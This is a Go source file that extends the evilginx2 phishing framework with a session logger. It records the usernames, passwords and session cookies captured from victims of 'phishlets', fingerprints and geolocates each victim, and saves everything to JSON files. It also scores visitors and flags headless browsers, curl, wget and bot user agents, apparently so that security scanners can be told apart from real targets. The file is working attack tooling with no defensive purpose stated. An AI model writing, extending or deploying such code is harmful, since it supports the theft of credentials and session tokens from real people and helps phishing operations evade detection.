package core

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// SessionLogger provides advanced session tracking with fingerprinting
type SessionLogger struct {
	logDir      string
	mu          sync.Mutex
	sessions    map[string]*EnhancedSession
	geoCache    map[string]*GeoLocation
	deviceCache map[string]*DeviceInfo
}

// EnhancedSession contains comprehensive session data
type EnhancedSession struct {
	SessionID     string            `json:"session_id"`
	Phishlet      string            `json:"phishlet"`
	Created       time.Time         `json:"created"`
	LastActivity  time.Time         `json:"last_activity"`
	Duration      time.Duration     `json:"duration"`
	RemoteAddr    string            `json:"remote_addr"`
	GeoLocation   *GeoLocation      `json:"geo_location,omitempty"`
	DeviceInfo    *DeviceInfo       `json:"device_info"`
	BrowserInfo   *BrowserInfo      `json:"browser_info"`
	Credentials   *CredentialInfo   `json:"credentials,omitempty"`
	Timeline      []TimelineEvent   `json:"timeline"`
	RequestCount  int               `json:"request_count"`
	DataTransfer  *DataTransferInfo `json:"data_transfer"`
	SecurityFlags *SecurityFlags    `json:"security_flags"`
	Cookies       []CookieInfo      `json:"cookies,omitempty"`
	Status        string            `json:"status"` // active, completed, expired, suspicious
	Score         int               `json:"score"`  // 0-100 legitimacy score
}

// GeoLocation contains geographical information
type GeoLocation struct {
	IP          string  `json:"ip"`
	Country     string  `json:"country"`
	CountryCode string  `json:"country_code"`
	Region      string  `json:"region"`
	City        string  `json:"city"`
	Latitude    float64 `json:"latitude"`
	Longitude   float64 `json:"longitude"`
	Timezone    string  `json:"timezone"`
	ISP         string  `json:"isp"`
	ASN         string  `json:"asn"`
}

// DeviceInfo contains device fingerprint data
type DeviceInfo struct {
	DeviceType  string `json:"device_type"` // desktop, mobile, tablet
	OS          string `json:"os"`          // Windows, Linux, Android, iOS, etc.
	OSVersion   string `json:"os_version"`
	ScreenSize  string `json:"screen_size,omitempty"`
	Fingerprint string `json:"fingerprint"` // MD5 hash of characteristics
	Language    string `json:"language"`
	Timezone    string `json:"timezone"`
	ColorDepth  string `json:"color_depth,omitempty"`
	Plugins     string `json:"plugins,omitempty"`
}

// BrowserInfo contains browser details
type BrowserInfo struct {
	Name           string `json:"name"` // Chrome, Firefox, Safari, etc.
	Version        string `json:"version"`
	Engine         string `json:"engine"` // Blink, Gecko, WebKit
	UserAgent      string `json:"user_agent"`
	AcceptLang     string `json:"accept_language"`
	AcceptEncoding string `json:"accept_encoding"`
	DNT            bool   `json:"dnt"`      // Do Not Track
	Headless       bool   `json:"headless"` // Detected headless browser
}

// CredentialInfo stores captured credentials
type CredentialInfo struct {
	Username       string            `json:"username"`
	Password       string            `json:"password"`
	CapturedAt     time.Time         `json:"captured_at"`
	Method         string            `json:"method"` // form, api, oauth
	AdditionalData map[string]string `json:"additional_data,omitempty"`
}

// TimelineEvent represents an action in the session
type TimelineEvent struct {
	Timestamp   time.Time `json:"timestamp"`
	EventType   string    `json:"event_type"` // page_visit, form_submit, api_call, cookie_set
	URL         string    `json:"url"`
	Method      string    `json:"method"`
	StatusCode  int       `json:"status_code"`
	Duration    int64     `json:"duration_ms"`
	DataSize    int       `json:"data_size"`
	Description string    `json:"description"`
}

// DataTransferInfo tracks data transfer
type DataTransferInfo struct {
	BytesSent     int64 `json:"bytes_sent"`
	BytesReceived int64 `json:"bytes_received"`
	RequestsSent  int   `json:"requests_sent"`
	ResponsesRecv int   `json:"responses_received"`
}

// SecurityFlags indicate potential security concerns
type SecurityFlags struct {
	VPNDetected        bool     `json:"vpn_detected"`
	ProxyDetected      bool     `json:"proxy_detected"`
	TorDetected        bool     `json:"tor_detected"`
	HeadlessBrowser    bool     `json:"headless_browser"`
	AutomationDetected bool     `json:"automation_detected"`
	SuspiciousPatterns []string `json:"suspicious_patterns,omitempty"`
	ThreatLevel        string   `json:"threat_level"` // low, medium, high
}

// CookieInfo stores cookie details
type CookieInfo struct {
	Name     string    `json:"name"`
	Value    string    `json:"value"`
	Domain   string    `json:"domain"`
	Path     string    `json:"path"`
	Expires  time.Time `json:"expires,omitempty"`
	Secure   bool      `json:"secure"`
	HttpOnly bool      `json:"http_only"`
	SameSite string    `json:"same_site"`
}

// NewSessionLogger creates a new advanced session logger
func NewSessionLogger(logDir string) *SessionLogger {
	if logDir == "" {
		logDir = "./sessions_advanced"
	}

	// Create log directory if it doesn't exist
	os.MkdirAll(logDir, 0755)

	return &SessionLogger{
		logDir:      logDir,
		sessions:    make(map[string]*EnhancedSession),
		geoCache:    make(map[string]*GeoLocation),
		deviceCache: make(map[string]*DeviceInfo),
	}
}

// StartSession creates a new enhanced session
func (sl *SessionLogger) StartSession(sessionID, phishlet, remoteAddr string, req *http.Request) {
	sl.mu.Lock()
	defer sl.mu.Unlock()

	session := &EnhancedSession{
		SessionID:    sessionID,
		Phishlet:     phishlet,
		Created:      time.Now(),
		LastActivity: time.Now(),
		RemoteAddr:   remoteAddr,
		Timeline:     []TimelineEvent{},
		DataTransfer: &DataTransferInfo{},
		SecurityFlags: &SecurityFlags{
			ThreatLevel: "low",
		},
		Status: "active",
		Score:  50, // Start with neutral score
	}

	// Extract and analyze device info
	session.DeviceInfo = sl.extractDeviceInfo(req)
	session.BrowserInfo = sl.extractBrowserInfo(req)

	// Get geolocation (from cache or lookup)
	ip := strings.Split(remoteAddr, ":")[0]
	session.GeoLocation = sl.getGeoLocation(ip)

	// Detect security threats
	sl.detectSecurityThreats(session, req)

	// Add initial timeline event
	session.AddTimelineEvent("session_start", req.URL.String(), req.Method, 0, 0, 0, "Session initiated")

	sl.sessions[sessionID] = session

	log.Info("[SessionLogger] Started enhanced session: %s (Phishlet: %s)", sessionID, phishlet)
}

// extractDeviceInfo extracts device information from request
func (sl *SessionLogger) extractDeviceInfo(req *http.Request) *DeviceInfo {
	ua := req.UserAgent()

	device := &DeviceInfo{
		DeviceType:  detectDeviceType(ua),
		OS:          detectOS(ua),
		OSVersion:   detectOSVersion(ua),
		Language:    req.Header.Get("Accept-Language"),
		Timezone:    detectTimezone(req),
		Fingerprint: sl.generateFingerprint(req),
	}

	return device
}

// extractBrowserInfo extracts browser information
func (sl *SessionLogger) extractBrowserInfo(req *http.Request) *BrowserInfo {
	ua := req.UserAgent()

	browser := &BrowserInfo{
		Name:           detectBrowser(ua),
		Version:        detectBrowserVersion(ua),
		Engine:         detectBrowserEngine(ua),
		UserAgent:      ua,
		AcceptLang:     req.Header.Get("Accept-Language"),
		AcceptEncoding: req.Header.Get("Accept-Encoding"),
		DNT:            req.Header.Get("DNT") == "1",
		Headless:       detectHeadless(req),
	}

	return browser
}

// generateFingerprint creates a unique device fingerprint
func (sl *SessionLogger) generateFingerprint(req *http.Request) string {
	data := fmt.Sprintf("%s|%s|%s|%s",
		req.UserAgent(),
		req.Header.Get("Accept-Language"),
		req.Header.Get("Accept-Encoding"),
		req.Header.Get("Accept"),
	)
	return fmt.Sprintf("%x", md5.Sum([]byte(data)))
}

// getGeoLocation retrieves geolocation data (cached or fresh lookup)
func (sl *SessionLogger) getGeoLocation(ip string) *GeoLocation {
	// Check cache first
	if geo, exists := sl.geoCache[ip]; exists {
		return geo
	}

	// Attempt to lookup (using free ipapi.co service)
	geo := &GeoLocation{IP: ip}

	resp, err := http.Get(fmt.Sprintf("https://ipapi.co/%s/json/", ip))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		body, _ := ioutil.ReadAll(resp.Body)
		json.Unmarshal(body, geo)
		sl.geoCache[ip] = geo
	} else {
		// Fallback to basic info
		geo.Country = "Unknown"
		geo.ISP = "Unknown"
	}

	return geo
}

// detectSecurityThreats analyzes request for security concerns
func (sl *SessionLogger) detectSecurityThreats(session *EnhancedSession, req *http.Request) {
	flags := session.SecurityFlags

	// Check for headless browser
	if session.BrowserInfo.Headless {
		flags.HeadlessBrowser = true
		flags.AutomationDetected = true
		flags.ThreatLevel = "high"
		session.Score -= 30
	}

	// Check for known VPN/Proxy IP ranges (simplified)
	ip := strings.Split(session.RemoteAddr, ":")[0]
	if sl.isVPNorProxy(ip) {
		flags.VPNDetected = true
		flags.ThreatLevel = "medium"
		session.Score -= 15
	}

	// Check for suspicious user agent
	ua := req.UserAgent()
	if strings.Contains(ua, "bot") || strings.Contains(ua, "curl") || strings.Contains(ua, "wget") {
		flags.AutomationDetected = true
		flags.SuspiciousPatterns = append(flags.SuspiciousPatterns, "Suspicious User-Agent")
		flags.ThreatLevel = "high"
		session.Score -= 25
	}

	// Check for missing common headers
	if req.Header.Get("Accept") == "" || req.Header.Get("Accept-Language") == "" {
		flags.SuspiciousPatterns = append(flags.SuspiciousPatterns, "Missing standard headers")
		session.Score -= 10
	}
}

// isVPNorProxy checks if IP is from known VPN/Proxy (simplified check)
func (sl *SessionLogger) isVPNorProxy(ip string) bool {
	// In production, use a proper VPN/Proxy detection API
	// This is a simplified check for common VPN networks
	vpnRanges := []string{"10.", "172.16.", "192.168.", "127."}
	for _, prefix := range vpnRanges {
		if strings.HasPrefix(ip, prefix) {
			return true
		}
	}
	return false
}

// LogEvent adds an event to the session timeline
func (sl *SessionLogger) LogEvent(sessionID, eventType, url, method string, statusCode, duration, dataSize int, description string) {
	sl.mu.Lock()
	defer sl.mu.Unlock()

	session, exists := sl.sessions[sessionID]
	if !exists {
		return
	}

	session.AddTimelineEvent(eventType, url, method, statusCode, duration, dataSize, description)
	session.LastActivity = time.Now()
	session.Duration = time.Since(session.Created)
	session.RequestCount++

	// Update data transfer stats
	if method == "POST" || method == "PUT" {
		session.DataTransfer.BytesSent += int64(dataSize)
		session.DataTransfer.RequestsSent++
	} else {
		session.DataTransfer.BytesReceived += int64(dataSize)
		session.DataTransfer.ResponsesRecv++
	}
}

// AddTimelineEvent adds an event to the timeline
func (s *EnhancedSession) AddTimelineEvent(eventType, url, method string, statusCode, durationMs, dataSize int, description string) {
	event := TimelineEvent{
		Timestamp:   time.Now(),
		EventType:   eventType,
		URL:         url,
		Method:      method,
		StatusCode:  statusCode,
		Duration:    int64(durationMs),
		DataSize:    dataSize,
		Description: description,
	}
	s.Timeline = append(s.Timeline, event)
}

// CaptureCredentials stores captured credentials
func (sl *SessionLogger) CaptureCredentials(sessionID, username, password, method string, additionalData map[string]string) {
	sl.mu.Lock()
	defer sl.mu.Unlock()

	session, exists := sl.sessions[sessionID]
	if !exists {
		return
	}

	session.Credentials = &CredentialInfo{
		Username:       username,
		Password:       password,
		CapturedAt:     time.Now(),
		Method:         method,
		AdditionalData: additionalData,
	}

	session.Score += 30 // Increase score for successful credential capture
	session.AddTimelineEvent("credentials_captured", "", "POST", 200, 0, 0, fmt.Sprintf("Captured credentials for user: %s", username))

	log.Important("[SessionLogger] Credentials captured for session %s: %s", sessionID, username)
}

// CaptureCookies stores captured cookies
func (sl *SessionLogger) CaptureCookies(sessionID string, cookies []*http.Cookie) {
	sl.mu.Lock()
	defer sl.mu.Unlock()

	session, exists := sl.sessions[sessionID]
	if !exists {
		return
	}

	for _, cookie := range cookies {
		sameSiteStr := ""
		switch cookie.SameSite {
		case http.SameSiteDefaultMode:
			sameSiteStr = "Default"
		case http.SameSiteLaxMode:
			sameSiteStr = "Lax"
		case http.SameSiteStrictMode:
			sameSiteStr = "Strict"
		case http.SameSiteNoneMode:
			sameSiteStr = "None"
		}

		cookieInfo := CookieInfo{
			Name:     cookie.Name,
			Value:    cookie.Value,
			Domain:   cookie.Domain,
			Path:     cookie.Path,
			Expires:  cookie.Expires,
			Secure:   cookie.Secure,
			HttpOnly: cookie.HttpOnly,
			SameSite: sameSiteStr,
		}
		session.Cookies = append(session.Cookies, cookieInfo)
	}

	session.Score += 20 // Increase score for cookie capture
	session.AddTimelineEvent("cookies_captured", "", "", 200, 0, 0, fmt.Sprintf("Captured %d cookies", len(cookies)))

	log.Info("[SessionLogger] Captured %d cookies for session %s", len(cookies), sessionID)
}

// CompleteSession marks a session as completed
func (sl *SessionLogger) CompleteSession(sessionID string) {
	sl.mu.Lock()
	defer sl.mu.Unlock()

	session, exists := sl.sessions[sessionID]
	if !exists {
		return
	}

	session.Status = "completed"
	session.Duration = time.Since(session.Created)
	session.AddTimelineEvent("session_complete", "", "", 0, 0, 0, "Session marked as completed")

	// Save session to disk
	sl.saveSession(session)

	log.Important("[SessionLogger] Session %s completed (Duration: %s, Score: %d, Threat: %s)",
		sessionID, session.Duration, session.Score, session.SecurityFlags.ThreatLevel)
}

// saveSession saves session data to JSON file
func (sl *SessionLogger) saveSession(session *EnhancedSession) {
	filename := fmt.Sprintf("%s_%s_%s.json",
		session.Phishlet,
		session.SessionID[:8],
		time.Now().Format("20060102_150405"),
	)

	filepath := filepath.Join(sl.logDir, filename)

	data, err := json.MarshalIndent(session, "", "  ")
	if err != nil {
		log.Error("[SessionLogger] Failed to marshal session data: %v", err)
		return
	}

	if err := ioutil.WriteFile(filepath, data, 0644); err != nil {
		log.Error("[SessionLogger] Failed to write session file: %v", err)
		return
	}

	log.Info("[SessionLogger] Session saved to: %s", filepath)
}

// GetSessionAnalytics returns analytics for a session
func (sl *SessionLogger) GetSessionAnalytics(sessionID string) map[string]interface{} {
	sl.mu.Lock()
	defer sl.mu.Unlock()

	session, exists := sl.sessions[sessionID]
	if !exists {
		return nil
	}

	analytics := map[string]interface{}{
		"session_id":       session.SessionID,
		"phishlet":         session.Phishlet,
		"duration":         session.Duration.String(),
		"status":           session.Status,
		"legitimacy_score": session.Score,
		"threat_level":     session.SecurityFlags.ThreatLevel,
		"total_requests":   session.RequestCount,
		"data_sent_kb":     session.DataTransfer.BytesSent / 1024,
		"data_recv_kb":     session.DataTransfer.BytesReceived / 1024,
		"device_type":      session.DeviceInfo.DeviceType,
		"os":               session.DeviceInfo.OS,
		"browser":          session.BrowserInfo.Name,
		"country":          session.GeoLocation.Country,
		"city":             session.GeoLocation.City,
		"has_credentials":  session.Credentials != nil,
		"cookie_count":     len(session.Cookies),
		"timeline_events":  len(session.Timeline),
	}

	return analytics
}

// Helper functions for detection

func detectDeviceType(ua string) string {
	ua = strings.ToLower(ua)
	if strings.Contains(ua, "mobile") || strings.Contains(ua, "android") || strings.Contains(ua, "iphone") {
		return "mobile"
	}
	if strings.Contains(ua, "tablet") || strings.Contains(ua, "ipad") {
		return "tablet"
	}
	return "desktop"
}

func detectOS(ua string) string {
	ua = strings.ToLower(ua)
	if strings.Contains(ua, "windows") {
		return "Windows"
	}
	if strings.Contains(ua, "mac") || strings.Contains(ua, "macintosh") {
		return "macOS"
	}
	if strings.Contains(ua, "linux") {
		return "Linux"
	}
	if strings.Contains(ua, "android") {
		return "Android"
	}
	if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") {
		return "iOS"
	}
	return "Unknown"
}

func detectOSVersion(ua string) string {
	// Simplified version detection
	if strings.Contains(ua, "Windows NT 10") {
		return "10"
	}
	if strings.Contains(ua, "Windows NT 6.3") {
		return "8.1"
	}
	if strings.Contains(ua, "Mac OS X") {
		parts := strings.Split(ua, "Mac OS X ")
		if len(parts) > 1 {
			version := strings.Split(parts[1], ")")[0]
			return strings.ReplaceAll(version, "_", ".")
		}
	}
	return "Unknown"
}

func detectBrowser(ua string) string {
	ua = strings.ToLower(ua)
	if strings.Contains(ua, "edg/") || strings.Contains(ua, "edge") {
		return "Edge"
	}
	if strings.Contains(ua, "chrome") && !strings.Contains(ua, "edg") {
		return "Chrome"
	}
	if strings.Contains(ua, "firefox") {
		return "Firefox"
	}
	if strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome") {
		return "Safari"
	}
	if strings.Contains(ua, "opera") || strings.Contains(ua, "opr") {
		return "Opera"
	}
	return "Unknown"
}

func detectBrowserVersion(ua string) string {
	// Simplified version detection
	patterns := map[string]string{
		"Chrome":  "Chrome/",
		"Firefox": "Firefox/",
		"Safari":  "Version/",
		"Edge":    "Edg/",
	}

	browser := detectBrowser(ua)
	if pattern, exists := patterns[browser]; exists {
		if idx := strings.Index(ua, pattern); idx != -1 {
			version := strings.Split(ua[idx+len(pattern):], " ")[0]
			return strings.Split(version, ".")[0]
		}
	}
	return "Unknown"
}

func detectBrowserEngine(ua string) string {
	ua = strings.ToLower(ua)
	if strings.Contains(ua, "webkit") && strings.Contains(ua, "chrome") {
		return "Blink"
	}
	if strings.Contains(ua, "webkit") {
		return "WebKit"
	}
	if strings.Contains(ua, "gecko") {
		return "Gecko"
	}
	return "Unknown"
}

func detectHeadless(req *http.Request) bool {
	ua := strings.ToLower(req.UserAgent())

	// Check for headless indicators
	if strings.Contains(ua, "headless") {
		return true
	}
	if strings.Contains(ua, "phantomjs") || strings.Contains(ua, "selenium") {
		return true
	}

	// Check for missing common headers (headless browsers often lack these)
	if req.Header.Get("Accept-Language") == "" && req.Header.Get("Accept") == "" {
		return true
	}

	return false
}

func detectTimezone(req *http.Request) string {
	// Try to extract from headers (if client sends it)
	if tz := req.Header.Get("X-Timezone"); tz != "" {
		return tz
	}
	return "Unknown"
}
